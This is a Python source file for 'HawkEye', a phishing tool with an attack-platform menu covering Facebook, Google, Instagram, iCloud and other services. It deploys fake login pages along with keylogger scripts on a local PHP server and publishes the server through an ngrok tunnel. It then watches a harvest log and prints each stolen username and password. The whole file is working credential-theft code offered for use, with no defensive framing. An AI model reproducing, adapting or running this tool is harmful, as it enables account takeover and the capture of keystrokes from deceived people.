import multiprocessing
import pathlib
from collections import Counter
from subprocess import call
from shlex import split
from distutils.dir_util import copy_tree
from exts.ngrok import Ngrok

YELLOW, MAGENTA, BLUE, RED, WHITE, CYAN, GREEN, DEFAULT  = '\033[93m', '\033[35m', '\u001b[34;1m' , '\033[1;91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
class HawkEye(object):

    def __init__(self):

        self.select_arrow = f'{BLUE}⮞{DEFAULT} '
        
        print('Importing Ngrok Extension...')
        self.ngrok_app = Ngrok()
        print('Checking Ngrok Installation...')
        if not bool(self.ngrok_app.installed): 
            print('No Ngrok installation detected, installing...')
            self.ngrok_app.install_ngrok()

        self.web_paths = {
            'Google': [
                'google_standard',
                'google_advanced_poll',
                'google_advanced_web'
            ],
            'Snapchat': ['Snapchat_web']
        }

        
        self.attack_vectors = (
            'Facebook',
            'Snapchat',
            'Google',
            'iCloud',
            'Microsoft',
            'Instagram',
            'Yahoo'
        )

    def generate_menu(self):
        print(f'''
<========================================================================>
||                                                                      ||
||     ██╗  ██╗ █████╗ ██╗    ██╗██╗  ██╗{BLUE}███████╗██╗   ██╗███████╗{DEFAULT}      ||
||     ██║  ██║██╔══██╗██║    ██║██║ ██╔╝{BLUE}██╔════╝╚██╗ ██╔╝██╔════╝{DEFAULT}      ||
||     ███████║███████║██║ █╗ ██║█████╔╝ {BLUE}█████╗   ╚████╔╝ █████╗  {DEFAULT}      ||
||     ██╔══██║██╔══██║██║███╗██║██╔═██╗ {BLUE}██╔══╝    ╚██╔╝  ██╔══╝  {DEFAULT}      ||
||     ██║  ██║██║  ██║╚███╔███╔╝██║  ██╗{BLUE}███████╗   ██║   ███████╗{DEFAULT}      ||
||     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝{BLUE}╚══════╝   ╚═╝   ╚══════╝{DEFAULT}      ||
||                                                                      || 
||                           \"You Are Free\"                             ||
||                                                                      ||
<========================================================================>                                                   
        ''')
        
        print('Choose The Attack Platform:\n')

        for ind, vector in enumerate(self.attack_vectors):
            print(f"   [{BLUE}{ind}{DEFAULT}] [{vector}]")
        
        while True:
            try:
                attack_resp = int(input(f"\nSelect Something {self.select_arrow}"))
                if(isinstance(attack_resp, int)) and attack_resp < len(self.attack_vectors): break
                print("Must be a listed option")

            except ValueError as e:
                print('Value must be an integer!')

        try:
            custom_option = self.load_attack(self.attack_vectors[attack_resp])
            redirect_target = self.custom_input(self.attack_vectors[attack_resp])
            self.run_phishing(self.attack_vectors[attack_resp], custom_option, redirect_target)
        except KeyboardInterrupt:
            print(f"\n{RED}Taking a step back...{DEFAULT}")
            self.generate_menu()

    def custom_input(self, web_site):
        custom = input(f"Custom Redirect Link ({YELLOW}Blank to Loop{DEFAULT}) {self.select_arrow}")

        if not(custom): custom = ''
        elif any(prefix in custom for prefix in ['http://', 'https://']): pass
        else: custom = 'http://'+ custom
        return(custom)

    def load_attack(self, attack_vector):

        extra_options = {
            self.attack_vectors[0]: [
                'Standard Phishing Page',
                'Advanced Phishing Page',
                'Fake Security Issue',
                'Facebook Messenger Page'
            ],

            self.attack_vectors[2]: [
                'Standard Phishing Page',
                'Advanced Phishing Page',
                'New Google Web'
            ],

            self.attack_vectors[5]: [
                'Standard Phishing Page',
                'Instagram Autolinker Phishing',
                'Instagram Advanced Scenario'
            ]
        }

        print(f'{RED}Loading Module {attack_vector}...{DEFAULT}')
        
        if attack_vector in [k for k in extra_options]:
            for ind, option in enumerate(extra_options[attack_vector]):
                print(f" [{BLUE}{ind}{DEFAULT}] [{option}]")
            while True:
                try: 
                    selected = int(input(f"\nSay Something {self.select_arrow}"))
                    if(isinstance(selected, int) and selected < len(extra_options[attack_vector])): break
                    print('Must be a listed option')
                except ValueError: print("Must be integer")
            return selected
        return 0

    def run_phishing(self, page, option, redirect_url):
        server_path = str(pathlib.Path('Server/www/').absolute())
        pages_path = str(pathlib.Path('WebPages').absolute())
        page_path = (pathlib.Path('WebPages') / self.web_paths[page][option])

        cmd_matrix = [
            ['rm', '-Rf', f'{server_path}/*.*'],
            ['rm', '-Rf', f'{server_path}/harvest.log'],
            ['touch', f'{server_path}/harvest.log'],
            ['touch', f'{server_path}/ip.log'],
            ['cp',  f'{pages_path}/ip.php', 'Server/www/'],
            ['cp', f'{pages_path}/KeyloggerData.txt', 'Server/www/'],
            ['cp', f'{pages_path}/keylogger.js', 'Server/www/'],
            ['cp', f'{pages_path}/keylogger.php', 'Server/www/']
        ]

        for cmd in cmd_matrix: call(cmd)
        
        if page_path.exists: copy_tree(str(page_path), server_path)

        port_num = 1337

        with self.ngrok_app.run_ngrok(port_num) as url:

            print(f'URL of Interest: [{BLUE}{url}{DEFAULT}]')

            if redirect_url == '': redirect_url = url
            
            login_page = pathlib.Path('Server/www/login.php')

            if(login_page.exists):
                with login_page.open('r') as login_file:
                    new_page = login_file.read()
                    new_page = new_page.replace('<CUSTOM>', redirect_url)

                with login_page.open('w') as login_file:
                    login_file.write(new_page)

                with login_page.open('r') as login_file:
                    new_page = login_file.read()

            call(f'cd Server/www && php -S 127.0.0.1:{port_num} > /dev/null 2>&1 &', shell=True)

            log_cnt = Counter({
                    'usernames': 0
                })
            
            while True:

                with open('Server/www/harvest.log') as creds:
                    data_blob = creds.read().splitlines()
                    nlines = len(data_blob)
                    #print(data_blob, nlines)
                    if nlines > log_cnt['usernames']:
                        #print(data_blob[log_cnt['usernames']])
                        (username, password) = data_blob[log_cnt['usernames']].split(',')
                        log_cnt['usernames'] += 1

                        print(
                            f"[{BLUE}Username{DEFAULT}] {username}\n"
                            f"[{BLUE}Password{DEFAULT}] {password}"
                        )

                with open('Server/www/ip.log') as headers:
                    data_blob = headers.read() 
                        
if __name__ == '__main__':
    
    hawkeye_app = HawkEye()
    hawkeye_app.generate_menu() 